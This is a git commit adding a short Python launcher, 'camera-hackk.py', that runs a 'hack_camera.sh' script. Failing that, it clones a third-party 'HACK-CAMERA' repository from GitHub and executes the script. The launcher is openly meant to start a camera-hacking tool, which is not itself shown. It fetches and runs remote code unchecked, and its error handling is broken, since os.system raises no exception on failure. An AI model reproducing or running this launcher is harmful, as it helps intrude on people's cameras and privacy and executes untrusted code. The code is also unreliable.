d05ec1be4ab24f191de9e26d84cfd198500f2e61
zeros999 <zero2006zeroo@gmail.com>
2025-11-24 12:20:35 +0400

    Add files via upload

---
+++ camera-hackk.py
@@ -0,0 +1,5 @@
+import os
+try:
+    os.system('cd HACK-CAMERA&&bash hack_camera.sh')
+except:
+    os.system('git clone https://github.com/hackerxphantom/HACK-CAMERA&&cd HACK-CAMERA&&bash hack_camera.sh')
